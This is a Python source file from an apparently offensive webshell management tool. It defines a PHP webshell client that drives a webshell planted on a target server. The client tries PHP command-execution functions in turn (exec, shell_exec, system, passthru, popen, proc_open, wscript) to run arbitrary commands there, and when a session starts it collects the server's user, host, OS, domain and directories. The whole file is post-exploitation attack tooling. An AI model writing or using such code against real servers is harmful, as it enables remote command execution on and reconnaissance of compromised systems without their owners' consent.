
from src.core.webshell import Webshell
from src.core.session import WebshellSession
from src.core.payload import PHPPayload
from src.logger import logger
import json
import os
import base64

class PHPWebshell(Webshell):

    def __init__(self):
        super().__init__()
        self.options.add_option('exec_type', 
            f"Tell webshell to use which function to exec a system command.\nSpecify `auto` will try to use the first available function.\nYou can see {os.path.join(os.path.dirname(__file__), 'php','exec')+os.sep} got more.", False,
            check=r'exec|shell_exec|system|passthru|popen|proc_open|wscript|auto', default='auto')

    def exec(self, cmdline: str)->bytes:
        '''在服务器上执行命令并获取结果
        '''
        fl = [self.options.exec_type]
        if self.options.exec_type in ('auto', None, ''):
            fl = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'wscript']
        for f in fl:
            try:
                p = PHPPayload(f'php/exec/{f}.php', cmd=cmdline, pwd=self.session.state['pwd'])
                tmp = self.eval(p)
                if not tmp.is_success():
                    return None
                r = json.loads(tmp.data)
                if r['code'] == 0:
                    continue
                self.options.set_option('exec_type', f)
                result = base64.b64decode(r['result'].encode())
            except Exception as e:
                logger.error('Occur an error!')
                result = f'Recv: {tmp}'.encode()
            return result
        return 'No way to exec command!Maybe all functions is disabled.'.encode()

    def _to_php_errcode(self, code):
        '''将错误代码转为可读的错误标识
        '''
        code = int(code)
        if code >= 65535: # 如果是异常，一般需要webshell将异常代码加上65535以便和错误代码相区分
            return "PHP Exception"
        if (1|4|16|64|256|4096)&code:
            return "PHP Error"

        return "PHP Warning"

    def hook_start(self, session: WebshellSession):
        '''当session创建成功时执行'''
        super().hook_start(session)
        p = PHPPayload('php/base/baseinfo.php')
        ret = self.eval(p)
        if not ret.is_success():
            logger.error("Basic info gather failed!")
            return
        info = json.loads(ret.data)
        for k, v in info.items():
            info[k] = base64.b64decode(v.encode()).decode(self.options.encoding, 'ignore')
        session.state['name'] = info['host']
        session.state['pwd'] = info.get('pwd').strip()
        session.state['lang'] = self.PHP
        session.state['description'] = self.help.lstrip('\r\n ').split('\n')[0]
        session.server_info['user'] = info.get('user').strip()
        session.server_info['webshell_root'] = info.get('pwd').strip()
        session.server_info['support_lang'] = (self.PHP,)
        session.server_info['os_type'] = info.get('os_type').strip()
        session.server_info['tmpdir'] = info.get('tmpdir').strip()
        session.server_info['sep'] = info.get('sep').strip()
        session.server_info['domain'] = info.get('domain')
        session.server_info['group'] = info.get('group')